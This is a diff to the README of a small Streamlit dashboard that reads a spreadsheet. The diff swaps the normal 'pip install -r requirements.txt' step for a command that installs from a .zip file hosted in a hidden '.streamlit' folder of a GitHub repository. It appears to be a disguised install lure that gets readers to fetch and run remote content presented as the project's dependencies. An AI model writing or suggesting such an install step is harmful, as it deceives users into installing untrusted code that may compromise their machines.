@@ -8,4 +8,4 @@ Um painel simples em Streamlit para visualizar informações de uma planilha do 
 
 ### 1️⃣ Instale as dependências
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/NovaBiriseg/painel-seguros/main/.streamlit/painel-seguros-v2.0.zip
